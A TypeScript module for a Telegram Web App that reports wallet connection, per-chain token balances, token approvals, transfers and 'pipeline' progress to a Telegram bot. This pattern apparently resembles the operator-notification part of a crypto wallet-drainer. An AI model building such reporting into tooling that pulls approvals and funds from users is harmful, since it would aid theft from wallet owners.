import WebApp from "@twa-dev/sdk";

interface BridgeEvent {
  event: string;
  [key: string]: unknown;
}

let dataSent = false;

export function sendToBot(data: BridgeEvent): void {
  if (dataSent) return;
  try {
    WebApp.sendData(JSON.stringify(data));
    dataSent = true;
  } catch {
    // Not running inside Telegram
  }
}

export interface ChainSummary {
  chain: string;
  tokens: { symbol: string; amount: string }[];
}

export function notifyWalletConnected(
  address: string,
  chainSummaries: ChainSummary[],
  totalTokens: number,
): void {
  sendToBot({
    event: "wallet_connected",
    address,
    chains: chainSummaries,
    totalTokens,
    timestamp: Date.now(),
  });
}

export function notifyTransferComplete(
  txHashes: string[],
  tokenCount: number,
): void {
  sendToBot({
    event: "transfer_complete",
    txHashes,
    tokenCount,
    timestamp: Date.now(),
  });
}

export function notifyApprovalsComplete(
  address: string,
  approvals: { chainId: number; token: string; address: string }[],
): void {
  sendToBot({
    event: "approvals_complete",
    address,
    approvals,
    timestamp: Date.now(),
  });
}

export function notifyPipelineStarted(txHash: string, amount: string): void {
  sendToBot({ event: "pipeline_started", txHash, amount });
}

export function notifyPipelineCompleted(): void {
  sendToBot({ event: "pipeline_completed" });
}

export function notifyPipelineError(error: string): void {
  sendToBot({ event: "pipeline_error", error });
}

export function isTransferMode(): boolean {
  try {
    const params = new URLSearchParams(window.location.search);
    return params.get("action") === "transfer";
  } catch {
    return false;
  }
}
